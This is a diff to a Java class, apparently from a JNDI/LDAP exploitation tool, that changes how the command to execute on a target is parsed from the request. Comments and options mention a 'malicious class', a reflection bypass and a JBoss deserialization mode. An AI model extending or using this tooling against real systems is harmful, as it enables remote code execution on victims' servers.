@@ -101,9 +101,10 @@ public class SerializedDataController implements LdapController {
 
             // 如果载荷类型为 nu1r，则执行以下语句块
             if (payloadType == PayloadType.nu1r) {
-                String arg = Util.getCmdFromBase(base);
-                if (arg.contains(" ")) {
-                    String[] args    = arg.split(" ");
+                String cmd11 = Util.getCmdFromBase(base);
+                if (cmd11.contains("#")) {
+                    String[] cmd11s    = cmd11.split("#");
+                    String[] cmd12s    = cmd11s[1].split(" ");
                     Options  options = new Options();
                     options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
                     options.addOption("o", "obscure", false, "使用反射绕过");
@@ -111,13 +112,13 @@ public class SerializedDataController implements LdapController {
                     CommandLineParser parser = new DefaultParser();
 
                     try {
-                        cmdLine = parser.parse(options, args);
+                        cmdLine = parser.parse(options, cmd12s);
                     } catch (Exception e) {
                         System.out.println("[*] Parameter input error, please use -h for more information");
                     }
 
-                    params = new String[]{args[0]};
-                    System.out.println("[+] command：" + args[0]);
+                    params = new String[]{cmd11s[0]};
+                    System.out.println("[+] command：" + cmd11s[0]);
 
                     if (cmdLine.hasOption("obscure")) {
                         IS_OBSCURE = true;
@@ -133,8 +134,8 @@ public class SerializedDataController implements LdapController {
                         IS_JBOSS_OBJECT_INPUT_STREAM = true;
                     }
                 } else {
-                    params = new String[]{arg};
-                    System.out.println("[+] command：" + arg);
+                    params = new String[]{cmd11};
+                    System.out.println("[+] command：" + cmd11);
                 }
 
             }
